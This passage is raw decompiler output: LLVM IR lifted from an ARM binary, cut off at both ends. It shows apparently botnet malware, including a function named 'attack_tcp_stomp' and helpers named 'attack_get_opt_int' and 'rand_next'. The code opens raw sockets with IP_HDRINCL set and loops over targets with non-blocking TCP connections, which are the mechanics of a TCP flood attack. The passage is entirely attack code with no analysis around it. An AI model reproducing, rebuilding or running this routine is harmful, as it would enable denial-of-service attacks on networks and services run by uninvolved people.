  %v2_94f0 = add i32 %v1_94f0, 12
  %v3_94f0 = inttoptr i32 %v2_94f0 to i32*
  store i32 %v0_94e0, i32* %v3_94f0, align 4
  br i1 %v9_94ec, label %dec_label_pc_94f8, label %dec_label_pc_94e0.dec_label_pc_9370_crit_edge

dec_label_pc_94e0.dec_label_pc_9370_crit_edge:    ; preds = %dec_label_pc_94e0
  %v1_9374.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9370

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94e0, %dec_label_pc_9360
  %v0_94f8 = call i32 @rand_next()
  %v3_9500 = urem i32 %v0_94f8, 65536
  %v1_9508 = sub nsw i32 999, %v3_9500
  store i32 %v1_9508, i32* %r3.global-to-local, align 4
  %v1_950c = trunc i32 %v0_94f8 to i16
  %v2_950c = load i32, i32* @r5, align 4
  %v3_950c = add i32 %v2_950c, 4
  %v4_950c = inttoptr i32 %v3_950c to i16*
  store i16 %v1_950c, i16* %v4_950c, align 2
  %v0_9510 = load i32, i32* %r3.global-to-local, align 4
  %v1_9510 = trunc i32 %v0_9510 to i16
  %v2_9510 = load i32, i32* @r6, align 4
  %v3_9510 = add i32 %v2_9510, 4
  %v4_9510 = inttoptr i32 %v3_9510 to i16*
  store i16 %v1_9510, i16* %v4_9510, align 2
  store i32 %v3_911c, i32* %r3.global-to-local, align 4
  %v1_9518 = load i32, i32* @r4, align 4
  %v9_9518 = icmp eq i32 %v3_911c, %v1_9518
  store i1 %v9_9518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9518, label %dec_label_pc_9520, label %dec_label_pc_937c

dec_label_pc_9520:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_9370
  %v0_9520 = call i32 @rand_next()
  %v1_9520 = trunc i32 %v0_9520 to i16
  store i32 %v3_9120, i32* %ip.global-to-local, align 4
  %v1_9528 = load i32, i32* @r4, align 4
  %v9_9528 = icmp eq i32 %v3_9120, %v1_9528
  store i1 %v9_9528, i1* %cpsr_z.global-to-local, align 1
  %v3_952c = load i32, i32* @r5, align 4
  %v4_952c = add i32 %v3_952c, 44
  %v5_952c = inttoptr i32 %v4_952c to i16*
  store i16 %v1_9520, i16* %v5_952c, align 2
  br i1 %v9_9528, label %dec_label_pc_9534, label %dec_label_pc_9388

dec_label_pc_9534:                                ; preds = %dec_label_pc_9520, %dec_label_pc_937c
  %v0_9534 = call i32 @rand_next()
  %v1_9534 = trunc i32 %v0_9534 to i16
  store i32 %v1_9118, i32* @lr, align 4
  store i1 %v2_953c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_953c, label %.thread29, label %bb85

.thread29:                                        ; preds = %dec_label_pc_9534
  %v3_954430 = load i32, i32* @r7, align 4
  %v4_954431 = add i32 %v3_954430, 2
  %v5_954432 = inttoptr i32 %v4_954431 to i16*
  store i16 %v1_9534, i16* %v5_954432, align 2
  br label %dec_label_pc_9550

bb85:                                             ; preds = %dec_label_pc_9534
  %v1_9540 = load i32, i32* @r5, align 4
  %v2_9540 = add i32 %v1_9540, 16
  %v3_9540 = inttoptr i32 %v2_9540 to i32*
  %v4_9540 = load i32, i32* %v3_9540, align 4
  store i32 %v4_9540, i32* %r3.global-to-local, align 4
  %v3_9544 = load i32, i32* @r7, align 4
  %v4_9544 = add i32 %v3_9544, 2
  %v5_9544 = inttoptr i32 %v4_9544 to i16*
  store i16 %v1_9534, i16* %v5_9544, align 2
  %v1_9548 = load i32, i32* %r3.global-to-local, align 4
  %v2_9548 = load i32, i32* @r6, align 4
  %v3_9548 = add i32 %v2_9548, 16
  %v4_9548 = inttoptr i32 %v3_9548 to i32*
  store i32 %v1_9548, i32* %v4_9548, align 4
  br label %dec_label_pc_939c

dec_label_pc_9550:                                ; preds = %.thread29, %dec_label_pc_9388
  %v0_9550 = call i32 @rand_next()
  store i32 %v1_906c, i32* %r1.global-to-local, align 4
  store i1 %v2_9558, i1* %cpsr_z.global-to-local, align 1
  %v1_955c = load i32, i32* @r6, align 4
  %v2_955c = add i32 %v1_955c, 16
  %v3_955c = inttoptr i32 %v2_955c to i32*
  store i32 %v0_9550, i32* %v3_955c, align 4
  br i1 %v2_9558, label %dec_label_pc_93a8, label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_939c, %dec_label_pc_9550
  %v0_9564 = load i32, i32* @r7, align 4
  %v1_9564 = add i32 %v0_9564, 8
  store i32 %v1_9564, i32* @r4, align 4
  store i32 %v6_904c, i32* %r1.global-to-local, align 4
  %v2_9570 = call i32 @rand_alphastr(i32 %v1_9564, i32 %v6_904c)
  store i32 %v6_904c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_957c = load i32, i32* @r4, align 4
  %v4_957c = add i32 %v2_957c, %v6_904c
  %v5_957c = inttoptr i32 %v4_957c to i8*
  store i8 0, i8* %v5_957c, align 1
  br label %dec_label_pc_93a8

dec_label_pc_9584:                                ; preds = %dec_label_pc_93a8, %dec_label_pc_932c
  %v2_9588 = call i32 @__GI_time(i32* null)
  store i32 %v2_90b0, i32* %ip.global-to-local, align 4
  %v9_9590 = icmp eq i32 %v2_90b0, %v2_9588
  store i1 %v9_9590, i1* %cpsr_z.global-to-local, align 1
  %v6_9594 = icmp slt i32 %v2_90b0, %v2_9588
  br i1 %v6_9594, label %dec_label_pc_9598, label %dec_label_pc_932c

dec_label_pc_9598:                                ; preds = %dec_label_pc_9584, %entry, %dec_label_pc_95a4
  %v1_95a0 = phi i32 [ %v3_90c4, %entry ], [ %v1_95a8, %dec_label_pc_95a4 ], [ %v2_9588, %dec_label_pc_9584 ]
  store i32 %v3_8f54, i32* %r4.global-to-local, align 4
  store i32 %v24_8f54, i32* %fp.global-to-local, align 4
  store i32 %v27_8f54, i32* %lr.global-to-local, align 4
  ret i32 %v1_95a0

dec_label_pc_95a4:                                ; preds = %dec_label_pc_90d4
  %v1_95a8 = call i32 @__GI___libc_close(i32 %v3_90c4)
  br label %dec_label_pc_9598

; uselistorder directives
  uselistorder i16 %v1_9534, { 1, 0 }
  uselistorder i32 %v1_9518, { 1, 0 }
  uselistorder i32 %v0_94f8, { 1, 0 }
  uselistorder i32 %v5_94cc, { 1, 0 }
  uselistorder i32 %v3_9480, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_946c, { 1, 0, 2 }
  uselistorder i32 %v1_9444, { 1, 2, 0, 3 }
  uselistorder i32 %v3_93f4, { 1, 0, 2 }
  uselistorder i1 %v2_9558, { 2, 3, 1, 0 }
  uselistorder i1 %v2_953c, { 2, 3, 1, 0 }
  uselistorder i1 %v7_9358, { 2, 1, 0 }
  uselistorder i32 %v0_92d8, { 1, 0 }
  uselistorder i32 %v1_9160, { 1, 0 }
  uselistorder i32 %v3_914c, { 2, 1, 0 }
  uselistorder i1 %v2_9124, { 1, 0, 2, 3 }
  uselistorder i32 %v1_9118, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_9114, { 1, 0 }
  uselistorder i32 %v0_9110, { 1, 0, 2, 3 }
  uselistorder i32 %v0_90fc, { 2, 0, 1, 3 }
  uselistorder i1 %v7_90f4, { 1, 0 }
  uselistorder i1 %v7_90c8, { 1, 0 }
  uselistorder i32 %v3_90c4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v2_90b0, { 2, 1, 0 }
  uselistorder i32 %v6_90a0, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 %v1_906c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_904c, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v1_9000, { 1, 2, 0 }
  uselistorder i32 %v1_8fdc, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8fd4, { 1, 0 }
  uselistorder i32 %v7_8fbc, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v6_8f98, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_8f80, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 27, 26, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 1, 0, 3, 2, 8, 9, 10 }
  uselistorder label %dec_label_pc_9598, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9564, { 1, 0 }
  uselistorder label %dec_label_pc_93a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_932c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i8 @__decompiler_undefined_function_3()
  %tmp33 = call i16 @__decompiler_undefined_function_2()
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp62 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_95b4 = load i32, i32* @r4, align 4
  %v27_95b4 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_95e0 = call i32 @calloc(i32 %arg2, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_95f0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_95f4 = load i32, i32* @r4, align 4
  store i32 %v0_95f4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_9600 = load i32, i32* @r7, align 4
  store i32 %v0_9600, i32* %r3.global-to-local, align 4
  %v0_9604 = load i32, i32* @r5, align 4
  store i32 %v0_9604, i32* %r0.global-to-local, align 4
  %v5_9608 = inttoptr i32 %v0_95f4 to i32*
  %v6_9608 = call i32 @attack_get_opt_int(i32 %v0_9604, i32* %v5_9608, i32 2, i32 %v0_9600, i32 %v2_95f0)
  %v1_9614 = urem i32 %v6_9608, 256
  store i32 %v1_9614, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9620 = load i32, i32* @r4, align 4
  store i32 %v0_9620, i32* %r1.global-to-local, align 4
  %v0_9624 = load i32, i32* @r5, align 4
  store i32 %v0_9624, i32* %r0.global-to-local, align 4
  %v5_9628 = trunc i32 %v6_9608 to i8
  %v6_962c = inttoptr i32 %v0_9620 to i32*
  %v7_962c = call i32 @attack_get_opt_int(i32 %v0_9624, i32* %v6_962c, i32 3, i32 65535, i32 %v6_9608)
  %v0_9630 = load i32, i32* @r4, align 4
  store i32 %v0_9630, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_962c, i32* @r8, align 4
  %v0_9640 = load i32, i32* @r5, align 4
  store i32 %v0_9640, i32* %r0.global-to-local, align 4
  %v5_9644 = inttoptr i32 %v0_9630 to i32*
  %v6_9644 = call i32 @attack_get_opt_int(i32 %v0_9640, i32* %v5_9644, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_964c = urem i32 %v6_9644, 256
  store i32 %v1_964c, i32* %ip.global-to-local, align 4
  %v0_9650 = load i32, i32* @r4, align 4
  store i32 %v0_9650, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_965c = load i32, i32* @r5, align 4
  store i32 %v0_965c, i32* %r0.global-to-local, align 4
  %v5_9660 = trunc i32 %v6_9644 to i8
  %v6_9664 = inttoptr i32 %v0_9650 to i32*
  %v7_9664 = call i32 @attack_get_opt_int(i32 %v0_965c, i32* %v6_9664, i32 5, i32 1, i32 %v6_9644)
  %v1_9670 = urem i32 %v7_9664, 256
  store i32 %v1_9670, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9678 = load i32, i32* @r4, align 4
  store i32 %v0_9678, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_9680 = load i32, i32* @r5, align 4
  store i32 %v0_9680, i32* %r0.global-to-local, align 4
  %v5_9688 = inttoptr i32 %v0_9678 to i32*
  %v6_9688 = call i32 @attack_get_opt_int(i32 %v0_9680, i32* %v5_9688, i32 7, i32 65535, i32 %v1_9670)
  %v0_968c = load i32, i32* @r4, align 4
  store i32 %v0_968c, i32* %r1.global-to-local, align 4
  %v3_9690 = mul i32 %v6_9688, 65536
  store i32 %v3_9690, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_9698 = load i32, i32* @r7, align 4
  store i32 %v0_9698, i32* %r3.global-to-local, align 4
  %v0_969c = load i32, i32* @r5, align 4
  store i32 %v0_969c, i32* %r0.global-to-local, align 4
  %v3_96a0 = urem i32 %v6_9688, 65536
  store i32 %v3_96a0, i32* @sb, align 4
  %v5_96a4 = inttoptr i32 %v0_968c to i32*
  %v6_96a4 = call i32 @attack_get_opt_int(i32 %v0_969c, i32* %v5_96a4, i32 10, i32 %v0_9698, i32 ptrtoint (i32* @0 to i32))
  %v1_96ac = urem i32 %v6_96a4, 256
  store i32 %v1_96ac, i32* %ip.global-to-local, align 4
  %v0_96b0 = load i32, i32* @r4, align 4
  store i32 %v0_96b0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96bc = load i32, i32* @r5, align 4
  store i32 %v0_96bc, i32* %r0.global-to-local, align 4
  %v5_96c4 = inttoptr i32 %v0_96b0 to i32*
  %v6_96c4 = call i32 @attack_get_opt_int(i32 %v0_96bc, i32* %v5_96c4, i32 11, i32 1, i32 %v1_96ac)
  %v1_96cc = urem i32 %v6_96c4, 256
  store i32 %v1_96cc, i32* %ip.global-to-local, align 4
  %v0_96d0 = load i32, i32* @r4, align 4
  store i32 %v0_96d0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  store i32 %v0_96dc, i32* %r0.global-to-local, align 4
  %v5_96e4 = inttoptr i32 %v0_96d0 to i32*
  %v6_96e4 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e4, i32 12, i32 1, i32 %v1_96cc)
  %v1_96ec = urem i32 %v6_96e4, 256
  store i32 %v1_96ec, i32* %ip.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r4, align 4
  store i32 %v0_96f0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_96f8 = load i32, i32* @r7, align 4
  store i32 %v0_96f8, i32* %r3.global-to-local, align 4
  %v0_96fc = load i32, i32* @r5, align 4
  store i32 %v0_96fc, i32* %r0.global-to-local, align 4
  %v5_9704 = inttoptr i32 %v0_96f0 to i32*
  %v6_9704 = call i32 @attack_get_opt_int(i32 %v0_96fc, i32* %v5_9704, i32 13, i32 %v0_96f8, i32 %v1_96ec)
  %v1_970c = urem i32 %v6_9704, 256
  store i32 %v1_970c, i32* %ip.global-to-local, align 4
  %v0_9710 = load i32, i32* @r4, align 4
  store i32 %v0_9710, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_9718 = load i32, i32* @r7, align 4
  store i32 %v0_9718, i32* %r3.global-to-local, align 4
  %v0_971c = load i32, i32* @r5, align 4
  store i32 %v0_971c, i32* %r0.global-to-local, align 4
  %v5_9724 = inttoptr i32 %v0_9710 to i32*
  %v6_9724 = call i32 @attack_get_opt_int(i32 %v0_971c, i32* %v5_9724, i32 14, i32 %v0_9718, i32 %v1_970c)
  %v1_972c = urem i32 %v6_9724, 256
  store i32 %v1_972c, i32* %ip.global-to-local, align 4
  %v0_9730 = load i32, i32* @r4, align 4
  store i32 %v0_9730, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_9738 = load i32, i32* @r7, align 4
  store i32 %v0_9738, i32* %r3.global-to-local, align 4
  %v0_973c = load i32, i32* @r5, align 4
  store i32 %v0_973c, i32* %r0.global-to-local, align 4
  %v5_9744 = inttoptr i32 %v0_9730 to i32*
  %v6_9744 = call i32 @attack_get_opt_int(i32 %v0_973c, i32* %v5_9744, i32 15, i32 %v0_9738, i32 %v1_972c)
  %v1_974c = urem i32 %v6_9744, 256
  store i32 %v1_974c, i32* %ip.global-to-local, align 4
  %v0_9750 = load i32, i32* @r7, align 4
  store i32 %v0_9750, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9758 = load i32, i32* @r4, align 4
  store i32 %v0_9758, i32* %r1.global-to-local, align 4
  %v0_975c = load i32, i32* @r5, align 4
  store i32 %v0_975c, i32* %r0.global-to-local, align 4
  %v5_9764 = inttoptr i32 %v0_9758 to i32*
  %v6_9764 = call i32 @attack_get_opt_int(i32 %v0_975c, i32* %v5_9764, i32 %v0_9750, i32 768, i32 %v1_974c)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9770 = load i32, i32* @r4, align 4
  store i32 %v0_9770, i32* %r1.global-to-local, align 4
  %v0_9778 = load i32, i32* @r5, align 4
  store i32 %v0_9778, i32* %r0.global-to-local, align 4
  %v5_977c = inttoptr i32 %v0_9770 to i32*
  %v6_977c = call i32 @attack_get_opt_int(i32 %v0_9778, i32* %v5_977c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9784 = urem i32 %v6_977c, 256
  store i32 %v1_9784, i32* %r3.global-to-local, align 4
  %v0_9788 = load i32, i32* @r7, align 4
  store i32 %v0_9788, i32* %r0.global-to-local, align 4
  %v1_9790 = inttoptr i32 %v0_9788 to i32*
  %v2_9790 = call i32 @__GI_time(i32* %v1_9790)
  %v1_9794 = load i32, i32* @r6, align 4
  %v2_9794 = add i32 %v1_9794, %v2_9790
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_97a8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_97a8, i32* %r0.global-to-local, align 4
  %v7_97ac = icmp eq i32 %v3_97a8, -1
  store i32 %v3_97a8, i32* @sl, align 4
  br i1 %v7_97ac, label %dec_label_pc_9aec, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_97c0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_97c0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_97c8 = load i32, i32* @r7, align 4
  store i32 %v0_97c8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_97d4 = call i32 @__GI_setsockopt(i32 %v3_97a8, i32 %v0_97c8, i32 3, i32 %v6_97c0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_97d4, i32* %r0.global-to-local, align 4
  %v7_97d8 = icmp eq i32 %v5_97d4, -1
  br i1 %v7_97d8, label %dec_label_pc_9ae4, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_97e4 = load i32, i32* @r8, align 4
  %v3_97e8 = urem i32 %v0_97e4, 65536
  store i32 %v3_97e8, i32* @r3, align 4
  %v2_97ec = icmp eq i32 %arg2, 0
  %v0_97f0 = load i32, i32* @r7, align 4
  store i32 %v0_97f0, i32* %stack_var_-44, align 4
  %v5_97f4 = trunc i32 %v0_97e4 to i16
  br i1 %v2_97ec, label %dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge, label %dec_label_pc_97fc.preheader

dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge: ; preds = %dec_label_pc_97e0
  %.pre = sext i16 %v5_97f4 to i32
  %.pre94 = add i32 %v6_9764, 40
  br label %dec_label_pc_9988.preheader

dec_label_pc_97fc.preheader:                      ; preds = %dec_label_pc_97e0
  %v2_9840 = ptrtoint i32* %stack_var_-160 to i32
  %v2_9888 = ptrtoint i32* %stack_var_-64 to i32
  %v2_98a0 = ptrtoint i32* %stack_var_-80 to i32
  %v2_98a8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_98ac = ptrtoint i32* %stack_var_-48 to i32
  %v4_9934 = zext i8 %tmp32 to i32
  %v1_9938 = and i32 %v4_9934, 18
  %v2_993c = icmp eq i32 %v1_9938, 18
  %v1_9bec = add i32 %v6_9764, 40
  %v4_9c2c = sext i16 %v5_97f4 to i32
  %v3_9c38 = udiv i32 %v4_9c2c, 256
  %v1_9d14 = urem i32 %v6_96a4, 2
  %tmp95 = sub nsw i32 0, %v1_9d14
  %v4_9d1c = and i32 %tmp95, 32
  %v1_9d48 = urem i32 %v6_96e4, 2
  %tmp96 = sub nsw i32 0, %v1_9d48
  %v4_9d50 = and i32 %tmp96, 8
  %v1_9d94 = urem i32 %v6_9744, 2
  %v3_9920 = sext i16 %tmp62 to i32
  %v1_9944 = and i32 %v4_9934, 5
  %v2_9944 = icmp eq i32 %v1_9944, 0
  %v4_9880 = add i32 %v2_9840, 98
  %v5_9880 = inttoptr i32 %v4_9880 to i16*
  %v1_9c34 = mul nsw i32 %v4_9c2c, 256
  %v4_9c44 = and i32 %v1_9c34, 65280
  %v5_9c44 = or i32 %v4_9c44, %v3_9c38
  %v1_9d2c = urem i32 %v6_96c4, 2
  %tmp97 = sub nsw i32 0, %v1_9d2c
  %v4_9d34 = and i32 %tmp97, 16
  %v1_9d60 = urem i32 %v6_9704, 2
  %tmp98 = sub nsw i32 0, %v1_9d60
  %v4_9d68 = and i32 %tmp98, 4
  %v1_9d78 = urem i32 %v6_9724, 2
  %tmp99 = sub nsw i32 0, %v1_9d78
  %v3_9d80 = and i32 %tmp99, 2
  br label %dec_label_pc_97fc.outer

dec_label_pc_97fc.outer:                          ; preds = %dec_label_pc_97fc.preheader, %.thread10
  %stack_var_-340.0.ph = phi i32 [ %tmp, %dec_label_pc_97fc.preheader ], [ %v0_9c78, %.thread10 ]
  %stack_var_-62.0.ph = phi i16 [ %tmp33, %dec_label_pc_97fc.preheader ], [ %stack_var_-62.2, %.thread10 ]
  %stack_var_-60.0.ph = phi i32 [ %tmp36, %dec_label_pc_97fc.preheader ], [ %v0_9b90, %.thread10 ]
  br label %dec_label_pc_97fc

dec_label_pc_97fc:                                ; preds = %dec_label_pc_97fc.outer, %dec_label_pc_9970
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9970 ], [ %stack_var_-62.0.ph, %dec_label_pc_97fc.outer ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9970 ], [ %stack_var_-60.0.ph, %dec_label_pc_97fc.outer ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9808 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9808, i32* %r0.global-to-local, align 4
  %v7_980c = icmp eq i32 %v3_9808, -1
  store i32 %v3_9808, i32* @r8, align 4
  br i1 %v7_980c, label %dec_label_pc_9970, label %dec_label_pc_9818

dec_label_pc_9818:                                ; preds = %dec_label_pc_97fc, %dec_label_pc_994c
  %v0_9820 = phi i32 [ %v3_9960, %dec_label_pc_994c ], [ %v3_9808, %dec_label_pc_97fc ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_994c ], [ %stack_var_-62.0, %dec_label_pc_97fc ]
  %stack_var_-60.1 = phi i32 [ %v0_9b90, %dec_label_pc_994c ], [ %stack_var_-60.0, %dec_label_pc_97fc ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_9820 = call i32 @__libc_fcntl(i32 %v0_9820, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9828 = or i32 %v2_9820, 2048
  store i32 %v1_9828, i32* @r2, align 4
  %v0_982c = load i32, i32* @r8, align 4
  store i32 %v0_982c, i32* %r0.global-to-local, align 4
  %v2_9830 = call i32 @__libc_fcntl(i32 %v0_982c, i32 4)
  store i32 %v2_9830, i32* %r0.global-to-local, align 4
  %v3_9834 = load i32, i32* %stack_var_-44, align 4
  %v5_983c = mul i32 %v3_9834, 24
  store i32 %v2_9840, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v1_984c = load i32, i32* @fp, align 4
  %v2_984c = add i32 %v1_984c, %v5_983c
  store i32 %v2_984c, i32* %r3.global-to-local, align 4
  %v1_9850 = add i32 %v2_984c, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  store i32 %v4_9850, i32* %r2.global-to-local, align 4
  %v2_9854 = icmp ugt i8 %v3_9850, 30
  %v7_9854 = icmp eq i8 %v3_9850, 31
  %v2_9858 = xor i1 %v7_9854, true
  %v3_9858 = and i1 %v2_9854, %v2_9858
  br i1 %v3_9858, label %bb, label %bb72

bb:                                               ; preds = %dec_label_pc_9818
  %v5_9858 = add i32 %v2_984c, 16
  %v6_9858 = inttoptr i32 %v5_9858 to i32*
  %v7_9858 = load i32, i32* %v6_9858, align 4
  store i32 %v7_9858, i32* %r3.global-to-local, align 4
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_9818, %bb
  %v4_985c = phi i32 [ %v2_984c, %dec_label_pc_9818 ], [ %v7_9858, %bb ]
  %v4_985c.stack_var_-60.1 = select i1 %v3_9858, i32 %v4_985c, i32 %stack_var_-60.1
  %v2_9860 = xor i1 %v2_9854, true
  %v3_9860 = or i1 %v7_9854, %v2_9860
  br i1 %v3_9860, label %dec_label_pc_9af8, label %dec_label_pc_9864

dec_label_pc_9864:                                ; preds = %bb72, %dec_label_pc_9af8
  %v0_9b90 = phi i32 [ %v5_9b44, %dec_label_pc_9af8 ], [ %v4_985c.stack_var_-60.1, %bb72 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_986c = load i32, i32* @sb, align 4
  %v9_986c = icmp eq i32 %v0_986c, 65535
  br i1 %v9_986c, label %dec_label_pc_9b50, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_9864
  %v4_9870 = udiv i32 %v0_986c, 256
  %v2_9874 = urem i32 %v0_986c, 256
  store i32 %v2_9874, i32* %r2.global-to-local, align 4
  %v5_9878 = mul nuw nsw i32 %v2_9874, 256
  %v6_9878 = or i32 %v5_9878, %v4_9870
  store i32 %v6_9878, i32* %r3.global-to-local, align 4
  store i32 %v2_9840, i32* %ip.global-to-local, align 4
  %v2_9880 = trunc i32 %v6_9878 to i16
  store i16 %v2_9880, i16* %v5_9880, align 2
  br label %dec_label_pc_9888

dec_label_pc_9888:                                ; preds = %.thread7, %dec_label_pc_9b50
  %stack_var_-62.2 = phi i16 [ %v1_9b50, %dec_label_pc_9b50 ], [ %stack_var_-62.1, %.thread7 ]
  store i32 %v2_9888, i32* %r1.global-to-local, align 4
